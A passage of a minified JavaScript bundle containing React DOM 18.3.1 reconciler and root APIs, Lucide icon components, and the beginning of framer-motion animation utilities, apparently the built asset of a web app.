if(n.tag===1){var l=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof l.componentDidCatch=="function"&&(Cn===null||!Cn.has(l))){e=Ni(o,e),e=Hh(n,e,1),n=Sn(n,e,1),e=lt(),n!==null&&(pr(n,1,e),ft(n,e));break}}n=n.return}}function Fv(e,n,o){var l=e.pingCache;l!==null&&l.delete(n),n=lt(),e.pingedLanes|=e.suspendedLanes&o,Qe===e&&(Ze&o)===o&&(Ge===4||Ge===3&&(Ze&130023424)===Ze&&500>ze()-$l?Xn(e,0):Wl|=o),ft(e,n)}function Ep(e,n){n===0&&((e.mode&1)===0?n=1:(n=Ss,Ss<<=1,(Ss&130023424)===0&&(Ss=4194304)));var o=lt();e=rn(e,n),e!==null&&(pr(e,n,o),ft(e,o))}function zv(e){var n=e.memoizedState,o=0;n!==null&&(o=n.retryLane),Ep(e,o)}function Vv(e,n){var o=0;switch(e.tag){case 13:var l=e.stateNode,u=e.memoizedState;u!==null&&(o=u.retryLane);break;case 19:l=e.stateNode;break;default:throw Error(r(314))}l!==null&&l.delete(n),Ep(e,o)}var Pp;Pp=function(e,n,o){if(e!==null)if(e.memoizedProps!==n.pendingProps||dt.current)ht=!0;else{if((e.lanes&o)===0&&(n.flags&128)===0)return ht=!1,Pv(e,n,o);ht=(e.flags&131072)!==0}else ht=!1,je&&(n.flags&1048576)!==0&&ah(n,Gs,n.index);switch(n.lanes=0,n.tag){case 2:var l=n.type;ao(e,n),e=n.pendingProps;var u=_i(n,tt.current);Li(n,o),u=kl(null,n,l,e,u,o);var g=xl();return n.flags|=1,typeof u=="object"&&u!==null&&typeof u.render=="function"&&u.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,ut(l)?(g=!0,Ws(n)):g=!1,n.memoizedState=u.state!==null&&u.state!==void 0?u.state:null,fl(n),u.updater=so,n.stateNode=u,u._reactInternals=n,Pl(n,l,e,o),n=Dl(null,n,l,!0,g,o)):(n.tag=0,je&&g&&rl(n),at(null,n,u,o),n=n.child),n;case 16:l=n.elementType;e:{switch(ao(e,n),e=n.pendingProps,u=l._init,l=u(l._payload),n.type=l,u=n.tag=Wv(l),e=Nt(l,e),u){case 0:n=Rl(null,n,l,e,o);break e;case 1:n=ep(null,n,l,e,o);break e;case 11:n=Jh(null,n,l,e,o);break e;case 14:n=Qh(null,n,l,Nt(l.type,e),o);break e}throw Error(r(306,l,""))}return n;case 0:return l=n.type,u=n.pendingProps,u=n.elementType===l?u:Nt(l,u),Rl(e,n,l,u,o);case 1:return l=n.type,u=n.pendingProps,u=n.elementType===l?u:Nt(l,u),ep(e,n,l,u,o);case 3:e:{if(tp(n),e===null)throw Error(r(387));l=n.pendingProps,g=n.memoizedState,u=g.element,mh(e,n),Xs(n,l,null,o);var b=n.memoizedState;if(l=b.element,g.isDehydrated)if(g={element:l,isDehydrated:!1,cache:b.cache,pendingSuspenseBoundaries:b.pendingSuspenseBoundaries,transitions:b.transitions},n.updateQueue.baseState=g,n.memoizedState=g,n.flags&256){u=Ni(Error(r(423)),n),n=np(e,n,l,o,u);break e}else if(l!==u){u=Ni(Error(r(424)),n),n=np(e,n,l,o,u);break e}else for(wt=vn(n.stateNode.containerInfo.firstChild),vt=n,je=!0,Bt=null,o=fh(n,null,l,o),n.child=o;o;)o.flags=o.flags&-3|4096,o=o.sibling;else{if(Mi(),l===u){n=on(e,n,o);break e}at(e,n,l,o)}n=n.child}return n;case 5:return vh(n),e===null&&al(n),l=n.type,u=n.pendingProps,g=e!==null?e.memoizedProps:null,b=u.children,Xa(l,u)?b=null:g!==null&&Xa(l,g)&&(n.flags|=32),Zh(e,n),at(e,n,b,o),n.child;case 6:return e===null&&al(n),null;case 13:return ip(e,n,o);case 4:return gl(n,n.stateNode.containerInfo),l=n.pendingProps,e===null?n.child=ji(n,null,l,o):at(e,n,l,o),n.child;case 11:return l=n.type,u=n.pendingProps,u=n.elementType===l?u:Nt(l,u),Jh(e,n,l,u,o);case 7:return at(e,n,n.pendingProps,o),n.child;case 8:return at(e,n,n.pendingProps.children,o),n.child;case 12:return at(e,n,n.pendingProps.children,o),n.child;case 10:e:{if(l=n.type._context,u=n.pendingProps,g=n.memoizedProps,b=u.value,Pe(Js,l._currentValue),l._currentValue=b,g!==null)if(Lt(g.value,b)){if(g.children===u.children&&!dt.current){n=on(e,n,o);break e}}else for(g=n.child,g!==null&&(g.return=n);g!==null;){var k=g.dependencies;if(k!==null){b=g.child;for(var A=k.firstContext;A!==null;){if(A.context===l){if(g.tag===1){A=sn(-1,o&-o),A.tag=2;var j=g.updateQueue;if(j!==null){j=j.shared;var F=j.pending;F===null?A.next=A:(A.next=F.next,F.next=A),j.pending=A}}g.lanes|=o,A=g.alternate,A!==null&&(A.lanes|=o),hl(g.return,o,n),k.lanes|=o;break}A=A.next}}else if(g.tag===10)b=g.type===n.type?null:g.child;else if(g.tag===18){if(b=g.return,b===null)throw Error(r(341));b.lanes|=o,k=b.alternate,k!==null&&(k.lanes|=o),hl(b,o,n),b=g.sibling}else b=g.child;if(b!==null)b.return=g;else for(b=g;b!==null;){if(b===n){b=null;break}if(g=b.sibling,g!==null){g.return=b.return,b=g;break}b=b.return}g=b}at(e,n,u.children,o),n=n.child}return n;case 9:return u=n.type,l=n.pendingProps.children,Li(n,o),u=Pt(u),l=l(u),n.flags|=1,at(e,n,l,o),n.child;case 14:return l=n.type,u=Nt(l,n.pendingProps),u=Nt(l.type,u),Qh(e,n,l,u,o);case 15:return Yh(e,n,n.type,n.pendingProps,o);case 17:return l=n.type,u=n.pendingProps,u=n.elementType===l?u:Nt(l,u),ao(e,n),n.tag=1,ut(l)?(e=!0,Ws(n)):e=!1,Li(n,o),Uh(n,l,u),Pl(n,l,u,o),Dl(null,n,l,!0,e,o);case 19:return sp(e,n,o);case 22:return Xh(e,n,o)}throw Error(r(156,n.tag))};function Ip(e,n){return lu(e,n)}function Uv(e,n,o,l){this.tag=e,this.key=o,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=l,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Rt(e,n,o,l){return new Uv(e,n,o,l)}function Xl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Wv(e){if(typeof e=="function")return Xl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===$)return 11;if(e===he)return 14}return 2}function _n(e,n){var o=e.alternate;return o===null?(o=Rt(e.tag,n,e.key,e.mode),o.elementType=e.elementType,o.type=e.type,o.stateNode=e.stateNode,o.alternate=e,e.alternate=o):(o.pendingProps=n,o.type=e.type,o.flags=0,o.subtreeFlags=0,o.deletions=null),o.flags=e.flags&14680064,o.childLanes=e.childLanes,o.lanes=e.lanes,o.child=e.child,o.memoizedProps=e.memoizedProps,o.memoizedState=e.memoizedState,o.updateQueue=e.updateQueue,n=e.dependencies,o.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},o.sibling=e.sibling,o.index=e.index,o.ref=e.ref,o}function vo(e,n,o,l,u,g){var b=2;if(l=e,typeof e=="function")Xl(e)&&(b=1);else if(typeof e=="string")b=5;else e:switch(e){case G:return ei(o.children,u,g,n);case X:b=8,u|=8;break;case ie:return e=Rt(12,o,n,u|2),e.elementType=ie,e.lanes=g,e;case ae:return e=Rt(13,o,n,u),e.elementType=ae,e.lanes=g,e;case H:return e=Rt(19,o,n,u),e.elementType=H,e.lanes=g,e;case ue:return wo(o,u,g,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case ge:b=10;break e;case Ae:b=9;break e;case $:b=11;break e;case he:b=14;break e;case oe:b=16,l=null;break e}throw Error(r(130,e==null?e:typeof e,""))}return n=Rt(b,o,n,u),n.elementType=e,n.type=l,n.lanes=g,n}function ei(e,n,o,l){return e=Rt(7,e,l,n),e.lanes=o,e}function wo(e,n,o,l){return e=Rt(22,e,l,n),e.elementType=ue,e.lanes=o,e.stateNode={isHidden:!1},e}function Zl(e,n,o){return e=Rt(6,e,null,n),e.lanes=o,e}function ec(e,n,o){return n=Rt(4,e.children!==null?e.children:[],e.key,n),n.lanes=o,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function $v(e,n,o,l,u){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Ea(0),this.expirationTimes=Ea(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ea(0),this.identifierPrefix=l,this.onRecoverableError=u,this.mutableSourceEagerHydrationData=null}function tc(e,n,o,l,u,g,b,k,A){return e=new $v(e,n,o,k,A),n===1?(n=1,g===!0&&(n|=8)):n=0,g=Rt(3,null,null,n),e.current=g,g.stateNode=e,g.memoizedState={element:l,isDehydrated:o,cache:null,transitions:null,pendingSuspenseBoundaries:null},fl(g),e}function Hv(e,n,o){var l=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:J,key:l==null?null:""+l,children:e,containerInfo:n,implementation:o}}function _p(e){if(!e)return kn;e=e._reactInternals;e:{if(Un(e)!==e||e.tag!==1)throw Error(r(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(ut(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(r(171))}if(e.tag===1){var o=e.type;if(ut(o))return rh(e,o,n)}return n}function Rp(e,n,o,l,u,g,b,k,A){return e=tc(o,l,!0,e,u,g,b,k,A),e.context=_p(null),o=e.current,l=lt(),u=Pn(o),g=sn(l,u),g.callback=n??null,Sn(o,g,u),e.current.lanes=u,pr(e,u,l),ft(e,l),e}function ko(e,n,o,l){var u=n.current,g=lt(),b=Pn(u);return o=_p(o),n.context===null?n.context=o:n.pendingContext=o,n=sn(g,b),n.payload={element:e},l=l===void 0?null:l,l!==null&&(n.callback=l),e=Sn(u,n,b),e!==null&&(Vt(e,u,b,g),Ys(e,u,b)),b}function xo(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Dp(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var o=e.retryLane;e.retryLane=o!==0&&o<n?o:n}}function nc(e,n){Dp(e,n),(e=e.alternate)&&Dp(e,n)}function Gv(){return null}var Mp=typeof reportError=="function"?reportError:function(e){console.error(e)};function ic(e){this._internalRoot=e}To.prototype.render=ic.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(r(409));ko(e,n,null,null)},To.prototype.unmount=ic.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;Yn(function(){ko(null,e,null,null)}),n[Zt]=null}};function To(e){this._internalRoot=e}To.prototype.unstable_scheduleHydration=function(e){if(e){var n=mu();e={blockedOn:null,target:e,priority:n};for(var o=0;o<mn.length&&n!==0&&n<mn[o].priority;o++);mn.splice(o,0,e),o===0&&vu(e)}};function rc(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function So(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function jp(){}function qv(e,n,o,l,u){if(u){if(typeof l=="function"){var g=l;l=function(){var j=xo(b);g.call(j)}}var b=Rp(n,l,e,0,null,!1,!1,"",jp);return e._reactRootContainer=b,e[Zt]=b.current,Er(e.nodeType===8?e.parentNode:e),Yn(),b}for(;u=e.lastChild;)e.removeChild(u);if(typeof l=="function"){var k=l;l=function(){var j=xo(A);k.call(j)}}var A=tc(e,0,!1,null,null,!1,!1,"",jp);return e._reactRootContainer=A,e[Zt]=A.current,Er(e.nodeType===8?e.parentNode:e),Yn(function(){ko(n,A,o,l)}),A}function Ao(e,n,o,l,u){var g=o._reactRootContainer;if(g){var b=g;if(typeof u=="function"){var k=u;u=function(){var A=xo(b);k.call(A)}}ko(n,b,e,u)}else b=qv(o,n,e,u,l);return xo(b)}fu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var o=hr(n.pendingLanes);o!==0&&(Pa(n,o|1),ft(n,ze()),(we&6)===0&&(Vi=ze()+500,xn()))}break;case 13:Yn(function(){var l=rn(e,1);if(l!==null){var u=lt();Vt(l,e,1,u)}}),nc(e,1)}},Ia=function(e){if(e.tag===13){var n=rn(e,134217728);if(n!==null){var o=lt();Vt(n,e,134217728,o)}nc(e,134217728)}},gu=function(e){if(e.tag===13){var n=Pn(e),o=rn(e,n);if(o!==null){var l=lt();Vt(o,e,n,l)}nc(e,n)}},mu=function(){return Se},yu=function(e,n){var o=Se;try{return Se=e,n()}finally{Se=o}},ka=function(e,n,o){switch(n){case"input":if(pa(e,o),n=o.name,o.type==="radio"&&n!=null){for(o=e;o.parentNode;)o=o.parentNode;for(o=o.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<o.length;n++){var l=o[n];if(l!==e&&l.form===e.form){var u=Vs(l);if(!u)throw Error(r(90));ua(l),pa(l,u)}}}break;case"textarea":Gd(e,o);break;case"select":n=o.value,n!=null&&bi(e,!!o.multiple,n,!1)}},tu=Jl,nu=Yn;var Kv={usingClientEntryPoint:!1,Events:[_r,Pi,Vs,Zd,eu,Jl]},$r={findFiberByHostInstance:Wn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Jv={bundleType:$r.bundleType,version:$r.version,rendererPackageName:$r.rendererPackageName,rendererConfig:$r.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:O.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=ou(e),e===null?null:e.stateNode},findFiberByHostInstance:$r.findFiberByHostInstance||Gv,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Co=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Co.isDisabled&&Co.supportsFiber)try{xs=Co.inject(Jv),Gt=Co}catch{}}return gt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Kv,gt.createPortal=function(e,n){var o=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!rc(n))throw Error(r(200));return Hv(e,n,null,o)},gt.createRoot=function(e,n){if(!rc(e))throw Error(r(299));var o=!1,l="",u=Mp;return n!=null&&(n.unstable_strictMode===!0&&(o=!0),n.identifierPrefix!==void 0&&(l=n.identifierPrefix),n.onRecoverableError!==void 0&&(u=n.onRecoverableError)),n=tc(e,1,!1,null,null,o,!1,l,u),e[Zt]=n.current,Er(e.nodeType===8?e.parentNode:e),new ic(n)},gt.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(r(188)):(e=Object.keys(e).join(","),Error(r(268,e)));return e=ou(n),e=e===null?null:e.stateNode,e},gt.flushSync=function(e){return Yn(e)},gt.hydrate=function(e,n,o){if(!So(n))throw Error(r(200));return Ao(null,e,n,!0,o)},gt.hydrateRoot=function(e,n,o){if(!rc(e))throw Error(r(405));var l=o!=null&&o.hydratedSources||null,u=!1,g="",b=Mp;if(o!=null&&(o.unstable_strictMode===!0&&(u=!0),o.identifierPrefix!==void 0&&(g=o.identifierPrefix),o.onRecoverableError!==void 0&&(b=o.onRecoverableError)),n=Rp(n,null,e,1,o??null,u,!1,g,b),e[Zt]=n.current,Er(e),l)for(e=0;e<l.length;e++)o=l[e],u=o._getVersion,u=u(o._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[o,u]:n.mutableSourceEagerHydrationData.push(o,u);return new To(n)},gt.render=function(e,n,o){if(!So(n))throw Error(r(200));return Ao(null,e,n,!1,o)},gt.unmountComponentAtNode=function(e){if(!So(e))throw Error(r(40));return e._reactRootContainer?(Yn(function(){Ao(null,null,e,!1,function(){e._reactRootContainer=null,e[Zt]=null})}),!0):!1},gt.unstable_batchedUpdates=Jl,gt.unstable_renderSubtreeIntoContainer=function(e,n,o,l){if(!So(o))throw Error(r(200));if(e==null||e._reactInternals===void 0)throw Error(r(38));return Ao(e,n,o,!1,l)},gt.version="18.3.1-next-f1338f8080-20240426",gt}var Up;function wg(){if(Up)return ac.exports;Up=1;function i(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(i)}catch(t){console.error(t)}}return i(),ac.exports=rw(),ac.exports}var Wp;function sw(){if(Wp)return Eo;Wp=1;var i=wg();return Eo.createRoot=i.createRoot,Eo.hydrateRoot=i.hydrateRoot,Eo}var ow=sw();const aw=id(ow);var lw={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const cw=i=>i.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),Fe=(i,t)=>{const r=S.forwardRef(({color:s="currentColor",size:a=24,strokeWidth:c=2,absoluteStrokeWidth:d,children:h,...p},f)=>S.createElement("svg",{ref:f,...lw,width:a,height:a,stroke:s,strokeWidth:d?Number(c)*24/Number(a):c,className:`lucide lucide-${cw(i)}`,...p},[...t.map(([m,y])=>S.createElement(m,y)),...(Array.isArray(h)?h:[h])||[]]));return r.displayName=`${i}`,r},dw=Fe("AlertTriangle",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",key:"c3ski4"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]),kg=Fe("Archive",[["rect",{width:"20",height:"5",x:"2",y:"3",rx:"1",key:"1wp1u1"}],["path",{d:"M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8",key:"1s80jp"}],["path",{d:"M10 12h4",key:"a56b0p"}]]),uw=Fe("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]),xg=Fe("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]),Tg=Fe("CalendarDays",[["rect",{width:"18",height:"18",x:"3",y:"4",rx:"2",ry:"2",key:"eu3xkr"}],["line",{x1:"16",x2:"16",y1:"2",y2:"6",key:"m3sa8f"}],["line",{x1:"8",x2:"8",y1:"2",y2:"6",key:"18kwsl"}],["line",{x1:"3",x2:"21",y1:"10",y2:"10",key:"xt86sb"}],["path",{d:"M8 14h.01",key:"6423bh"}],["path",{d:"M12 14h.01",key:"1etili"}],["path",{d:"M16 14h.01",key:"1gbofw"}],["path",{d:"M8 18h.01",key:"lrp35t"}],["path",{d:"M12 18h.01",key:"mhygvu"}],["path",{d:"M16 18h.01",key:"kzsmim"}]]),hw=Fe("ChevronLeft",[["path",{d:"m15 18-6-6 6-6",key:"1wnfg3"}]]),pw=Fe("ChevronRight",[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]),fw=Fe("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]),gw=Fe("Github",[["path",{d:"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4",key:"tonef"}],["path",{d:"M9 18c-4.51 2-5-2-7-2",key:"9comsn"}]]),mw=Fe("Heart",[["path",{d:"M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",key:"c3ymky"}]]),yw=Fe("Home",[["path",{d:"m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"y5dka4"}],["polyline",{points:"9 22 9 12 15 12 15 22",key:"e2us08"}]]),bw=Fe("Linkedin",[["path",{d:"M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z",key:"c2jq9f"}],["rect",{width:"4",height:"12",x:"2",y:"9",key:"mk3on5"}],["circle",{cx:"4",cy:"4",r:"2",key:"bt5ra8"}]]),vw=Fe("MessageSquare",[["path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",key:"1lielz"}]]),ww=Fe("Rss",[["path",{d:"M4 11a9 9 0 0 1 9 9",key:"pv89mb"}],["path",{d:"M4 4a16 16 0 0 1 16 16",key:"k0647b"}],["circle",{cx:"5",cy:"19",r:"1",key:"bfqh0e"}]]),Sg=Fe("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]),kw=Fe("Send",[["path",{d:"m22 2-7 20-4-9-9-4Z",key:"1q3vgg"}],["path",{d:"M22 2 11 13",key:"nzbqef"}]]),xw=Fe("Tag",[["path",{d:"M12 2H2v10l9.29 9.29c.94.94 2.48.94 3.42 0l6.58-6.58c.94-.94.94-2.48 0-3.42L12 2Z",key:"14b2ls"}],["path",{d:"M7 7h.01",key:"7u93v4"}]]),Tw=Fe("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]),Sw=Fe("Twitter",[["path",{d:"M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z",key:"pff0z6"}]]),Ag=Fe("UserCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"10",r:"3",key:"ilqhr7"}],["path",{d:"M7 20.662V19a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v1.662",key:"154egf"}]]),Uo=Fe("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]),Aw=Fe("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),Cg=S.createContext({transformPagePoint:i=>i,isStatic:!1,reducedMotion:"never"}),Zo=S.createContext({}),ea=S.createContext(null),ta=typeof document<"u",sd=ta?S.useLayoutEffect:S.useEffect,Eg=S.createContext({strict:!1}),od=i=>i.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase(),Cw="framerAppearId",Pg="data-"+od(Cw);function Ew(i,t,r,s){const{visualElement:a}=S.useContext(Zo),c=S.useContext(Eg),d=S.useContext(ea),h=S.useContext(Cg).reducedMotion,p=S.useRef();s=s||c.renderer,!p.current&&s&&(p.current=s(i,{visualState:t,parent:a,props:r,presenceContext:d,blockInitialAnimation:d?d.initial===!1:!1,reducedMotionConfig:h}));const f=p.current;S.useInsertionEffect(()=>{f&&f.update(r,d)});const m=S.useRef(!!(r[Pg]&&!window.HandoffComplete));return sd(()=>{f&&(f.render(),m.current&&f.animationState&&f.animationState.animateChanges())}),S.useEffect(()=>{f&&(f.updateFeatures(),!m.current&&f.animationState&&f.animationState.animateChanges(),m.current&&(m.current=!1,window.HandoffComplete=!0))}),f}function Qi(i){return i&&typeof i=="object"&&Object.prototype.hasOwnProperty.call(i,"current")}function Pw(i,t,r){return S.useCallback(s=>{s&&i.mount&&i.mount(s),t&&(s?t.mount(s):t.unmount()),r&&(typeof r=="function"?r(s):Qi(r)&&(r.current=s))},[t])}function os(i){return typeof i=="string"||Array.isArray(i)}function na(i){return i!==null&&typeof i=="object"&&typeof i.start=="function"}const ad=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],ld=["initial",...ad];function ia(i){return na(i.animate)||ld.some(t=>os(i[t]))}function Ig(i){return!!(ia(i)||i.variants)}function Iw(i,t){if(ia(i)){const{initial:r,animate:s}=i;return{initial:r===!1||os(r)?r:void 0,animate:os(s)?s:void 0}}return i.inherit!==!1?t:{}}function _w(i){const{initial:t,animate:r}=Iw(i,S.useContext(Zo));return S.useMemo(()=>({initial:t,animate:r}),[$p(t),$p(r)])}function $p(i){return Array.isArray(i)?i.join(" "):i}const Hp={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]},as={};for(const i in Hp)as[i]={isEnabled:t=>Hp[i].some(r=>!!t[r])};function Rw(i){for(const t in i)as[t]={...as[t],...i[t]}}const cd=S.createContext({}),_g=S.createContext({}),Dw=Symbol.for("motionComponentSymbol");function Mw({preloadedFeatures:i,createVisualElement:t,useRender:r,useVisualState:s,Component:a}){i&&Rw(i);function c(h,p){let f;const m={...S.useContext(Cg),...h,layoutId:jw(h)},{isStatic:y}=m,v=_w(h),w=s(h,y);if(!y&&ta){v.visualElement=Ew(a,w,m,t);const P=S.useContext(_g),T=S.useContext(Eg).strict;v.visualElement&&(f=v.visualElement.loadFeatures(m,T,i,P))}return S.createElement(Zo.Provider,{value:v},f&&v.visualElement?S.createElement(f,{visualElement:v.visualElement,...m}):null,r(a,h,Pw(w,v.visualElement,p),w,y,v.visualElement))}const d=S.forwardRef(c);return d[Dw]=a,d}function jw({layoutId:i}){const t=S.useContext(cd).id;return t&&i!==void 0?t+"-"+i:i}function Ow(i){function t(s,a={}){return Mw(i(s,a))}if(typeof Proxy>"u")return t;const r=new Map;return new Proxy(t,{get:(s,a)=>(r.has(a)||r.set(a,t(a)),r.get(a))})}const Lw=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function dd(i){return typeof i!="string"||i.includes("-")?!1:!!(Lw.indexOf(i)>-1||/[A-Z]/.test(i))}const Wo={};function Bw(i){Object.assign(Wo,i)}const us=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],fi=new Set(us);function Rg(i,{layout:t,layoutId:r}){return fi.has(i)||i.startsWith("origin")||(t||r!==void 0)&&(!!Wo[i]||i==="opacity")}const mt=i=>!!(i&&i.getVelocity),Nw={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},Fw=us.length;function zw(i,{enableHardwareAcceleration:t=!0,allowTransformNone:r=!0},s,a){let c="";for(let d=0;d<Fw;d++){const h=us[d];if(i[h]!==void 0){const p=Nw[h]||h;c+=`${p}(${i[h]}) `}}return t&&!i.z&&(c+="translateZ(0)"),c=c.trim(),a?c=a(i,s?"":c):r&&s&&(c="none"),c}const Dg=i=>t=>typeof t=="string"&&t.startsWith(i),Mg=Dg("--"),jc=Dg("var(--"),Vw=/var\s*\(\s*--[\w-]+(\s*,\s*(?:(?:[^)(]|\((?:[^)(]+|\([^)(]*\))*\))*)+)?\s*\)/g,Uw=(i,t)=>t&&typeof i=="number"?t.transform(i):i,Nn=(i,t,r)=>Math.min(Math.max(r,i),t),gi={test:i=>typeof i=="number",parse:parseFloat,transform:i=>i},Zr={...gi,transform:i=>Nn(0,1,i)},Po={...gi,default:1},es=i=>Math.round(i*1e5)/1e5,ra=/(-)?([\d]*\.?[\d])+/g,jg=/(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))/gi,Ww=/^(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))$/i;function hs(i){return typeof i=="string"}const ps=i=>({test:t=>hs(t)&&t.endsWith(i)&&t.split(" 